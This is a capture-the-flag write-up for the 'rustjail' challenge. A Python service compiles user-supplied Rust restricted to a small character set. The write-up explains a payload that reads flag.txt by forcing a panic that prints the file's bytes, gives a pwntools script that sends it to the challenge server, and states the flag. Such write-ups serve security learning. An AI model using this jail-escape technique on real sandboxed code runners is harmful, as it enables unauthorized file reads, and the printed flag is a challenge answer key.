# rustjail

```
hmm the iron bars in this jail cell are rusty ... is that easier or harder to break than regular iron bars?

nc challs2.pyjail.club 21051
```

Attachment:

```python
#!/usr/bin/python3
import string
import os

allowed = set(string.ascii_lowercase+string.digits+' :._(){}"')

os.environ['RUSTUP_HOME']='/usr/local/rustup'
os.environ['CARGO_HOME']='/usr/local/cargo'
os.environ['PATH']='/usr/local/cargo/bin:/usr/bin'

inp = input("gib cod: ").strip()
if not allowed.issuperset(set(inp)):
    print("bad cod")
    exit()
with open("/tmp/cod.rs", "w") as f:
    f.write(inp)
os.system("/usr/local/cargo/bin/rustc /tmp/cod.rs -o /tmp/cod")
os.system("/tmp/cod; echo Exited with status $?")
```

We need to write a Rust program only using characters in `allowed`. Steps:

1. read flag content via `std::fs::read("flag.txt")`
2. print the flag content out via `std::fs::read("flag.txt").unwrap_err()`, since we cannot use macros due to `!` or write to stdout because we cannot `use std::io::Write;` due to `;`
3. since the main function cannot have return type due to `->`, use `std::panic::panic_any` to convert return type to `!` (never return)

The panic message looks like:

```
thread 'main' panicked at /tmp/cod.rs:1:61:
called `Result::unwrap_err()` on an `Ok` value: [106, 97, 105, 108, 123, 114, 117, 115, 116, 106, 97, 105, 108, 95, 99, 49, 57, 51, 56, 102, 97, 100, 57, 98, 99, 48, 50, 125, 10]
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
```

Attack:

```python
from pwn import *
context(log_level = "debug")

p = remote("challs2.pyjail.club", 21051)
#p = process(["python3", "main.py"])
p.sendline(b'fn main() { std::panic::panic_any(std::fs::read("flag.txt").unwrap_err())}')
s = p.recvall().decode()
for line in s.splitlines():
    if line.startswith("called"):
        arr = line.split("[")[1].split("]")[0]
        arr = eval("[" + arr + "]")
        print(bytes(arr))
```

Flag: `jail{rustjail_c1938fad9bc02}`.
